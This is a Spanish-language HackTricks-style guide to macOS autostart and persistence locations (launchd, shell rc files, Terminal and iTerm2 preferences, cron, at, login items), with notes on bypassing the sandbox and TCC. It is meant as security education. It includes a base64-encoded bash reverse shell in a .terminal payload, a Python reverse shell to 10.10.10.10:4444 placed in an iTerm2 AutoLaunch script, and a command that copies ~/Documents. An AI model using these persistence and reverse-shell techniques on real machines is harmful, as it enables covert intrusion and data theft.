# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Esta sección se basa en gran medida en la serie de blogs [**Más allá de los buenos viejos LaunchAgents**](https://theevilbit.github.io/beyond/), el objetivo es agregar **más ubicaciones de Autostart** (si es posible), indicar **qué técnicas siguen funcionando** hoy en día con la última versión de macOS (13.4) y especificar los **permisos** necesarios.

## Bypass de Sandbox

> [!TIP]
> Aquí puedes encontrar ubicaciones de inicio útiles para **bypass de sandbox** que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando** una **acción** muy **común**, una **cantidad de tiempo** determinada o una **acción que normalmente puedes realizar** desde dentro de un sandbox sin necesidad de permisos de root.

### Launchd

- Útil para el bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicaciones

- **`/Library/LaunchAgents`**
- **Disparador**: Reinicio
- Se requiere root
- **`/Library/LaunchDaemons`**
- **Disparador**: Reinicio
- Se requiere root
- **`/System/Library/LaunchAgents`**
- **Disparador**: Reinicio
- Se requiere root
- **`/System/Library/LaunchDaemons`**
- **Disparador**: Reinicio
- Se requiere root
- **`~/Library/LaunchAgents`**
- **Disparador**: Reingreso
- **`~/Library/LaunchDemons`**
- **Disparador**: Reingreso

> [!TIP]
> Como dato interesante, **`launchd`** tiene una lista de propiedades incrustada en la sección Mach-o `__Text.__config` que contiene otros servicios bien conocidos que launchd debe iniciar. Además, estos servicios pueden contener `RequireSuccess`, `RequireRun` y `RebootOnSuccess`, lo que significa que deben ejecutarse y completarse con éxito.
>
> Por supuesto, no se puede modificar debido a la firma de código.

#### Descripción y Explotación

**`launchd`** es el **primer** **proceso** ejecutado por el kernel de OX S al inicio y el último en finalizar al apagarse. Siempre debe tener el **PID 1**. Este proceso **lee y ejecuta** las configuraciones indicadas en los **plists** de **ASEP** en:

- `/Library/LaunchAgents`: Agentes por usuario instalados por el administrador
- `/Library/LaunchDaemons`: Daemons a nivel de sistema instalados por el administrador
- `/System/Library/LaunchAgents`: Agentes por usuario proporcionados por Apple.
- `/System/Library/LaunchDaemons`: Daemons a nivel de sistema proporcionados por Apple.

Cuando un usuario inicia sesión, los plists ubicados en `/Users/$USER/Library/LaunchAgents` y `/Users/$USER/Library/LaunchDemons` se inician con los **permisos del usuario conectado**.

La **principal diferencia entre agentes y daemons es que los agentes se cargan cuando el usuario inicia sesión y los daemons se cargan al inicio del sistema** (ya que hay servicios como ssh que necesitan ejecutarse antes de que cualquier usuario acceda al sistema). Además, los agentes pueden usar GUI mientras que los daemons necesitan ejecutarse en segundo plano.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Hay casos en los que un **agente necesita ser ejecutado antes de que el usuario inicie sesión**, estos se llaman **PreLoginAgents**. Por ejemplo, esto es útil para proporcionar tecnología asistencial al iniciar sesión. También se pueden encontrar en `/Library/LaunchAgents` (ver [**aquí**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un ejemplo).

> [!NOTE]
> Nuevos archivos de configuración de Daemons o Agents serán **cargados después del próximo reinicio o usando** `launchctl load <target.plist>` También es **posible cargar archivos .plist sin esa extensión** con `launchctl -F <file>` (sin embargo, esos archivos plist no se cargarán automáticamente después del reinicio).\
> También es posible **descargar** con `launchctl unload <target.plist>` (el proceso señalado por él será terminado),
>
> Para **asegurar** que no haya **nada** (como una anulación) **previniendo** que un **Agente** o **Daemon** **se ejecute**, ejecuta: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Lista todos los agentes y daemons cargados por el usuario actual:
```bash
launchctl list
```
> [!WARNING]
> Si un plist es propiedad de un usuario, incluso si está en carpetas de sistema de demonios, **la tarea se ejecutará como el usuario** y no como root. Esto puede prevenir algunos ataques de escalada de privilegios.

#### Más información sobre launchd

**`launchd`** es el **primer** proceso en modo usuario que se inicia desde el **núcleo**. El inicio del proceso debe ser **exitoso** y **no puede salir ni fallar**. Está incluso **protegido** contra algunas **señales de terminación**.

Una de las primeras cosas que haría `launchd` es **iniciar** todos los **demonios** como:

- **Demonios de temporizador** basados en el tiempo para ser ejecutados:
- atd (`com.apple.atrun.plist`): Tiene un `StartInterval` de 30min
- crond (`com.apple.systemstats.daily.plist`): Tiene `StartCalendarInterval` para iniciar a las 00:15
- **Demonios de red** como:
- `org.cups.cups-lpd`: Escucha en TCP (`SockType: stream`) con `SockServiceName: printer`
- SockServiceName debe ser un puerto o un servicio de `/etc/services`
- `com.apple.xscertd.plist`: Escucha en TCP en el puerto 1640
- **Demonios de ruta** que se ejecutan cuando un camino específico cambia:
- `com.apple.postfix.master`: Verificando la ruta `/etc/postfix/aliases`
- **Demonios de notificaciones de IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Puerto Mach:**
- `com.apple.xscertd-helper.plist`: Indica en la entrada `MachServices` el nombre `com.apple.xscertd.helper`
- **UserEventAgent:**
- Esto es diferente del anterior. Hace que launchd inicie aplicaciones en respuesta a eventos específicos. Sin embargo, en este caso, el binario principal involucrado no es `launchd` sino `/usr/libexec/UserEventAgent`. Carga plugins de la carpeta restringida por SIP /System/Library/UserEventPlugins/ donde cada plugin indica su inicializador en la clave `XPCEventModuleInitializer` o, en el caso de plugins más antiguos, en el diccionario `CFPluginFactories` bajo la clave `FB86416D-6164-2070-726F-70735C216EC0` de su `Info.plist`.

### archivos de inicio de shell

Escritura: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Escritura (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Útil para eludir sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Pero necesitas encontrar una aplicación con un bypass de TCC que ejecute un shell que cargue estos archivos

#### Ubicaciones

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Disparador**: Abrir un terminal con zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Disparador**: Abrir un terminal con zsh
- Se requiere root
- **`~/.zlogout`**
- **Disparador**: Salir de un terminal con zsh
- **`/etc/zlogout`**
- **Disparador**: Salir de un terminal con zsh
- Se requiere root
- Potencialmente más en: **`man zsh`**
- **`~/.bashrc`**
- **Disparador**: Abrir un terminal con bash
- `/etc/profile` (no funcionó)
- `~/.profile` (no funcionó)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Disparador**: Se espera que se active con xterm, pero **no está instalado** y, incluso después de instalarlo, se lanza este error: xterm: `DISPLAY is not set`

#### Descripción y explotación

Al iniciar un entorno de shell como `zsh` o `bash`, **se ejecutan ciertos archivos de inicio**. macOS actualmente utiliza `/bin/zsh` como el shell predeterminado. Este shell se accede automáticamente cuando se lanza la aplicación Terminal o cuando se accede a un dispositivo a través de SSH. Aunque `bash` y `sh` también están presentes en macOS, deben ser invocados explícitamente para ser utilizados.

La página del manual de zsh, que podemos leer con **`man zsh`**, tiene una larga descripción de los archivos de inicio.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Aplicaciones Reabiertas

> [!CAUTION]
> Configurar la explotación indicada y cerrar sesión e iniciar sesión o incluso reiniciar no funcionó para mí para ejecutar la aplicación. (La aplicación no se estaba ejecutando, tal vez necesita estar en funcionamiento cuando se realizan estas acciones)

**Escritura**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Útil para eludir sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Disparador**: Reiniciar aplicaciones reabiertas

#### Descripción y Explotación

Todas las aplicaciones para reabrir están dentro del plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Así que, para hacer que las aplicaciones reabiertas lancen la tuya, solo necesitas **agregar tu aplicación a la lista**.

El UUID se puede encontrar listando ese directorio o con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para verificar las aplicaciones que se volverán a abrir puedes hacer:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Para **agregar una aplicación a esta lista** puedes usar:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferencias del Terminal

- Útil para eludir sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- El uso del Terminal tiene permisos de FDA del usuario que lo utiliza

#### Ubicación

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Disparador**: Abrir Terminal

#### Descripción y Explotación

En **`~/Library/Preferences`** se almacenan las preferencias del usuario en las Aplicaciones. Algunas de estas preferencias pueden contener una configuración para **ejecutar otras aplicaciones/scripts**.

Por ejemplo, el Terminal puede ejecutar un comando en el Inicio:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Esta configuración se refleja en el archivo **`~/Library/Preferences/com.apple.Terminal.plist`** de la siguiente manera:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Entonces, si el plist de las preferencias del terminal en el sistema pudiera ser sobrescrito, la funcionalidad de **`open`** puede ser utilizada para **abrir el terminal y ese comando será ejecutado**.

Puedes agregar esto desde la línea de comandos con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Otras extensiones de archivo

- Útil para eludir sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Uso de Terminal para tener permisos de FDA del usuario que lo utiliza

#### Ubicación

- **Cualquier lugar**
- **Disparador**: Abrir Terminal

#### Descripción y Explotación

Si creas un [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) y lo abres, la **aplicación Terminal** se invocará automáticamente para ejecutar los comandos indicados allí. Si la aplicación Terminal tiene algunos privilegios especiales (como TCC), tu comando se ejecutará con esos privilegios especiales.

Pruébalo con:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Podrías usar también las extensiones **`.command`**, **`.tool`**, con contenido de scripts de shell regulares y también se abrirán con Terminal.

> [!CAUTION]
> Si el terminal tiene **Acceso Completo al Disco** podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de terminal).

### Plugins de Audio

Escritura: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Escritura: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Podrías obtener acceso adicional a TCC

#### Ubicación

- **`/Library/Audio/Plug-Ins/HAL`**
- Se requiere root
- **Disparador**: Reiniciar coreaudiod o el ordenador
- **`/Library/Audio/Plug-ins/Components`**
- Se requiere root
- **Disparador**: Reiniciar coreaudiod o el ordenador
- **`~/Library/Audio/Plug-ins/Components`**
- **Disparador**: Reiniciar coreaudiod o el ordenador
- **`/System/Library/Components`**
- Se requiere root
- **Disparador**: Reiniciar coreaudiod o el ordenador

#### Descripción

Según las escrituras anteriores, es posible **compilar algunos plugins de audio** y hacer que se carguen.

### Plugins de QuickLook

Escritura: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Podrías obtener acceso adicional a TCC

#### Ubicación

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descripción y Explotación

Los plugins de QuickLook pueden ejecutarse cuando **activas la vista previa de un archivo** (presiona la barra espaciadora con el archivo seleccionado en Finder) y un **plugin que soporte ese tipo de archivo** está instalado.

Es posible compilar tu propio plugin de QuickLook, colocarlo en una de las ubicaciones anteriores para cargarlo y luego ir a un archivo soportado y presionar espacio para activarlo.

### ~~Hooks de Inicio/Cierre de Sesión~~

> [!CAUTION]
> Esto no funcionó para mí, ni con el LoginHook del usuario ni con el LogoutHook de root

**Escritura**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Necesitas poder ejecutar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Ub`icado en `~/Library/Preferences/com.apple.loginwindow.plist`

Están en desuso, pero se pueden usar para ejecutar comandos cuando un usuario inicia sesión.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Esta configuración se almacena en `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Para eliminarlo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
El usuario root se almacena en **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass Condicional de Sandbox

> [!TIP]
> Aquí puedes encontrar ubicaciones de inicio útiles para **bypass de sandbox** que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando condiciones no muy comunes** como programas **específicos instalados, acciones de usuario "poco comunes"** o entornos.

### Cron

**Escritura**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Útil para el bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Sin embargo, necesitas poder ejecutar el binario `crontab`
- O ser root
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Se requiere root para acceso de escritura directo. No se requiere root si puedes ejecutar `crontab <file>`
- **Disparador**: Depende del trabajo cron

#### Descripción y Explotación

Lista los trabajos cron del **usuario actual** con:
```bash
crontab -l
```
También puedes ver todos los trabajos cron de los usuarios en **`/usr/lib/cron/tabs/`** y **`/var/at/tabs/`** (necesita root).

En MacOS se pueden encontrar varias carpetas que ejecutan scripts con **cierta frecuencia** en:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Ahí puedes encontrar los **cron** **jobs** regulares, los **at** **jobs** (no muy utilizados) y los **periodic** **jobs** (principalmente utilizados para limpiar archivos temporales). Los trabajos periódicos diarios se pueden ejecutar, por ejemplo, con: `periodic daily`.

Para agregar un **user cronjob programáticamente** es posible usar:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Útil para eludir sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 solía tener permisos de TCC concedidos

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: Abrir iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: Abrir iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: Abrir iTerm

#### Description & Exploitation

Los scripts almacenados en **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** se ejecutarán. Por ejemplo:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
o:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
El script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** también se ejecutará:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Las preferencias de iTerm2 ubicadas en **`~/Library/Preferences/com.googlecode.iterm2.plist`** pueden **indicar un comando a ejecutar** cuando se abre el terminal iTerm2.

Esta configuración se puede ajustar en la configuración de iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Y el comando se refleja en las preferencias:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Puedes establecer el comando a ejecutar con:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Es muy probable que haya **otras formas de abusar de las preferencias de iTerm2** para ejecutar comandos arbitrarios.

### xbar

Escritura: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero xbar debe estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Solicita permisos de Accesibilidad

#### Ubicación

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Disparador**: Una vez que se ejecute xbar

#### Descripción

Si el popular programa [**xbar**](https://github.com/matryer/xbar) está instalado, es posible escribir un script de shell en **`~/Library/Application\ Support/xbar/plugins/`** que se ejecutará cuando se inicie xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Escritura**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero Hammerspoon debe estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Solicita permisos de Accesibilidad

#### Ubicación

- **`~/.hammerspoon/init.lua`**
- **Disparador**: Una vez que se ejecuta hammerspoon

#### Descripción

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) sirve como una plataforma de automatización para **macOS**, aprovechando el **lenguaje de scripting LUA** para sus operaciones. Notablemente, soporta la integración de código completo de AppleScript y la ejecución de scripts de shell, mejorando significativamente sus capacidades de scripting.

La aplicación busca un solo archivo, `~/.hammerspoon/init.lua`, y cuando se inicia, el script se ejecutará.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero BetterTouchTool debe estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Solicita permisos de Automatización-Creación de accesos directos y Accesibilidad

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Esta herramienta permite indicar aplicaciones o scripts a ejecutar cuando se presionan algunos accesos directos. Un atacante podría configurar su propio **acceso directo y acción a ejecutar en la base de datos** para hacer que ejecute código arbitrario (un acceso directo podría ser simplemente presionar una tecla).

### Alfred

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero Alfred debe estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- Solicita permisos de Automatización, Accesibilidad e incluso acceso a Disco Completo

#### Location

- `???`

Permite crear flujos de trabajo que pueden ejecutar código cuando se cumplen ciertas condiciones. Potencialmente, es posible que un atacante cree un archivo de flujo de trabajo y haga que Alfred lo cargue (se necesita pagar la versión premium para usar flujos de trabajo).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero ssh necesita estar habilitado y ser utilizado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
- El uso de SSH requiere acceso FDA

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Inicio de sesión a través de ssh
- **`/etc/ssh/sshrc`**
- Se requiere root
- **Trigger**: Inicio de sesión a través de ssh

> [!CAUTION]
> Para activar ssh se requiere Acceso Completo al Disco:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Por defecto, a menos que `PermitUserRC no` en `/etc/ssh/sshd_config`, cuando un usuario **inicia sesión a través de SSH** los scripts **`/etc/ssh/sshrc`** y **`~/.ssh/rc`** se ejecutarán.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero necesitas ejecutar `osascript` con argumentos
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Inicio de sesión
- Carga útil de explotación almacenada llamando a **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Inicio de sesión
- Se requiere root

#### Description

En Preferencias del Sistema -> Usuarios y Grupos -> **Elementos de inicio de sesión** puedes encontrar **elementos que se ejecutarán cuando el usuario inicie sesión**.\
Es posible listarlos, agregarlos y eliminarlos desde la línea de comandos:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Estos elementos se almacenan en el archivo **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Los **elementos de inicio de sesión** también pueden indicarse utilizando la API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) que almacenará la configuración en **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP como Elemento de Inicio de Sesión

(Revisa la sección anterior sobre Elementos de Inicio de Sesión, esto es una extensión)

Si almacenas un archivo **ZIP** como un **Elemento de Inicio de Sesión**, el **`Archive Utility`** lo abrirá y si el zip fue, por ejemplo, almacenado en **`~/Library`** y contenía la carpeta **`LaunchAgents/file.plist`** con un backdoor, esa carpeta será creada (no lo está por defecto) y el plist será añadido para que la próxima vez que el usuario inicie sesión, el **backdoor indicado en el plist será ejecutado**.

Otra opción sería crear los archivos **`.bash_profile`** y **`.zshenv`** dentro del HOME del usuario, así que si la carpeta LaunchAgents ya existe, esta técnica seguiría funcionando.

### At

Escritura: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero necesitas **ejecutar** **`at`** y debe estar **habilitado**
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Necesitas **ejecutar** **`at`** y debe estar **habilitado**

#### **Descripción**

Las tareas de `at` están diseñadas para **programar tareas únicas** que se ejecuten en ciertos momentos. A diferencia de los trabajos cron, las tareas de `at` se eliminan automáticamente después de la ejecución. Es crucial notar que estas tareas son persistentes a través de reinicios del sistema, marcándolas como posibles preocupaciones de seguridad bajo ciertas condiciones.

Por **defecto** están **deshabilitadas** pero el usuario **root** puede **habilitarlas** con:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Esto creará un archivo en 1 hora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Verifica la cola de trabajos usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Arriba podemos ver dos trabajos programados. Podemos imprimir los detalles del trabajo usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Si las tareas AT no están habilitadas, las tareas creadas no se ejecutarán.

Los **archivos de trabajo** se pueden encontrar en `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
